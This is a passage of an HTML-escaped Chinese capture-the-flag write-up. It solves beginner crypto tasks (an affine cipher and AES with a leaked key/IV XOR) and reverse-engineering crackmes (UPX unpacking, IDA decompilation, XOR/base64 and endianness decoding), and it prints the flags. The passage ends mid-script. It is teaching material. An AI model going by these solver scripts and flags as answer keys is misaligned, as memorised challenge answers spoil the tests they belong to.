&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for k0 in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for k1 in range(256):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        inv_k0 = mod_inverse(k0, 256)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if not inv_k0:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            continue
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        decrypted = [(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(known_text)]]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if bytes(decrypted) == known_text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(bytes([(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(ciphertext)]]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{4ff1ne_c1pher_i5_very_3azy}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-babyaes&quot;&gt;[Week 1]babyaes&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-babyaes&quot; aria-label=&quot;Anchor link for: week-1-babyaes&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Cipher import AES
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import os
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from flag import flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def pad(data):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return data + b&amp;quot;&amp;quot;.join([b&amp;#39;\x00&amp;#39; for _ in range(0, 16 - len(data))])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def main():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    flag_ = pad(flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    key = os.urandom(16) * 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    iv = os.urandom(16)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    aes = AES.new(key, AES.MODE_CBC, iv)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    enc_flag = aes.encrypt(flag_)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(enc_flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if __name__ == &amp;quot;__main__&amp;quot;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    main()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 3657491768215750635844958060963805125333761387746954618540958489914964573229
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# b&amp;#39;&amp;gt;]\xc1\xe5\x82&#x2F;\x02\x7ft\xf1B\x8d\n\xc1\x95i&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由于 key 是由一段随机 16bit 的值复制两次拼接出来的值，并且给出了 $key\ \oplus\ iv\ \oplus\ 1$ 的值，因此可以先异或 1 得到 $key\ \oplus\ iv$ 的值。&lt;&#x2F;p&gt;
&lt;p&gt;由于此时的 key 为 32bit，而 iv 为 16bit，因此解出来的值得前半段就是 key 值，再通过将前半段异或后半段即可得到 iv 值，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;xor_result_bytes = long_to_bytes(xor_result ^ 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = xor_result_bytes[:16] * 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;key = {key}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;iv = {iv}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# key = b&amp;#39;\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# iv = b&amp;#39;\xe3Z\x19Ga&amp;gt;\x07\xcc\xd1\xa1X\x01c\x11\x16\x00&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将解出的 key 和 iv 丢进 AES 中进行解密即可得到 flag，完整脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Cipher import AES
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc_flag = b&amp;#39;&amp;gt;]\xc1\xe5\x82&#x2F;\x02\x7ft\xf1B\x8d\n\xc1\x95i&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;xor_result_bytes = long_to_bytes(xor_result ^ 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(xor_result_bytes)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = xor_result_bytes[:16] * 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;key = {key}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;iv = {iv}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;aes = AES.new(key, AES.MODE_CBC, iv)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dec_flag = aes.decrypt(enc_flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(dec_flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# b&amp;#39;firsT_cry_Aes\x00\x00\x00&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;reverse&quot;&gt;Reverse&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse&quot; aria-label=&quot;Anchor link for: reverse&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;week-1-easy-re&quot;&gt;[Week 1]easy_RE&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-easy-re&quot; aria-label=&quot;Anchor link for: week-1-easy-re&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 ida64 打开可以得到前半部分 flag ，如下图&lt;&#x2F;p&gt;
&lt;p&gt;通过按 F5 反编译可以得到后半部分 flag ，如下图&lt;&#x2F;p&gt;
&lt;p&gt;故 flag 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{we1c0me_to_rev3rse!!}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-ke&quot;&gt;[Week 1]咳&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-ke&quot; aria-label=&quot;Anchor link for: week-1-ke&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;题目描述中存在壳，用查壳软件看看，如下图&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FjJRCfmdtbKA2NAxc3iF8%252F%25E5%2592%25B3-1.png%3Falt%3Dmedia%26token%3D8388cf8a-b1de-4ec0-a465-2792fded509c&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=b315f35440a8f65852bc75987e8558f820e38fb7226319e7522eabe240a6f58c&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;需要使用 upx 去壳，如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ upx -d &amp;quot;KE.exe&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                       Ultimate Packer for eXecutables
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                           right (C) 1996 - 2020
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;UPX 3.96w       Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd 2020
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        File size         Ratio      Format      Name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   --------------------   ------   -----------   -----------
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    133760 &amp;lt;-     68224   51.00%    win64&#x2F;pe     KE.exe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Unpacked 1 file.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;去壳完成后用 ida64 打开，通过反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 i; &#x2F;&#x2F; r10
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *v4; &#x2F;&#x2F; kr00_8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char Str1[96]; &#x2F;&#x2F; [rsp+20h] [rbp-88h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int v7; &#x2F;&#x2F; [rsp+80h] [rbp-28h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  _main();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  memset(Str1, 0, sizeof(Str1));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v7 = 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Hello();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  scanf(&amp;quot;%s&amp;quot;, Str1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( i = 0i64; ; ++i )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v4 = &amp;amp;Str1[strlen(Str1)];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ( i &amp;gt;= v4 - Str1 )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      break;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ++Str1[i];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  if ( !strncmp(Str1, enc, v4 - Str1) )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;WOW!!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  else
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;I believe you can do it!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  system(&amp;quot;pause&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;并且可以找到&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc = &amp;quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可得该函数将密文是由明文的每个字符转ascii值后加一得到的，要得到明文则将每个字符的ascii值减一即可。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;str = &amp;quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for s in str:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(chr(ord(s) - 1), end=&amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-segments&quot;&gt;[Week 1]Segments&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-segments&quot; aria-label=&quot;Anchor link for: week-1-segments&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;百度 &lt;code&gt;IDA的Segments窗口要怎么打开呢&lt;&#x2F;code&gt; ，可以得到结果 &lt;code&gt;Shift+F7&lt;&#x2F;code&gt; ，将 Segments 窗口中的 name 拼凑起来就是 flag。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-elf&quot;&gt;[Week 1]ELF&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-elf&quot; aria-label=&quot;Anchor link for: week-1-elf&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 ida64 打开，通过反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned int v3; &#x2F;&#x2F; edx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *s1; &#x2F;&#x2F; [rsp+0h] [rbp-20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *v6; &#x2F;&#x2F; [rsp+8h] [rbp-18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-10h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  s = (char *)malloc(0x64uLL);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  printf(&amp;quot;Input flag: &amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  fgets(s, 100, stdin);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  s[strcspn(s, &amp;quot;\n&amp;quot;)] = 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v6 = (char *)encode(s);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v3 = strlen(v6);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  s1 = (char *)base64_encode(v6, v3);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  if ( !strcmp(s1, &amp;quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&amp;quot;) )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;Correct&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  else
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    puts(&amp;quot;Wrong&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  free(v6);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  free(s1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  free(s);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;_BYTE *__fastcall encode(const char *a1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  size_t v1; &#x2F;&#x2F; rax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int v2; &#x2F;&#x2F; eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  _BYTE *v4; &#x2F;&#x2F; [rsp+20h] [rbp-20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int i; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int v6; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v1 = strlen(a1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v4 = malloc(2 * v1 + 1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v6 = 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( i = 0; i &amp;lt; strlen(a1); ++i )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v2 = v6++;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v4[v2] = (a1[i] ^ 0x20) + 16;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v4[v6] = 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return v4;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可知密文是由明文的每个字符与 0x20 进行异或后加 16 并进行 base64 编码得到的，要得到明文则先进行 base64 解码后将所得的每个位减去 16 再和 0x20 异或即可，脚本如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import base64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;encoded_str = &amp;quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;decoded_bytes = base64.b64decode(encoded_str)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(decoded_bytes)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for s in decoded_bytes:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(chr((s - 16) ^ 0x20), end=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# flag{D0_4ou_7now_wha7_ELF_1s?}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-endian&quot;&gt;[Week 1]Endian&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-endian&quot; aria-label=&quot;Anchor link for: week-1-endian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 ida64 打开，通过反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int i; &#x2F;&#x2F; [rsp+4h] [rbp-3Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *v5; &#x2F;&#x2F; [rsp+8h] [rbp-38h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char v6[40]; &#x2F;&#x2F; [rsp+10h] [rbp-30h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v7 = __readfsqword(0x28u);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;please input your flag&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  __isoc99_scanf(&amp;quot;%s&amp;quot;, v6);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v5 = v6;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( i = 0; i &amp;lt;= 4; ++i )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      printf(&amp;quot;wrong!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      exit(0);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v5 += 4;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  printf(&amp;quot;you are right&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;并且 array 数组内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可知密文是通过将明文每四个为一组和 0x12345678 进行异或后得到的，但由于是低位存储，所以需要将每一组逆向过来的值进行反向即可得到 flag，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array_data = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for data in array_data:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(bytes(reversed(long_to_bytes(data ^ 0x12345678))).decode(), end=&amp;#39;&amp;#39;)
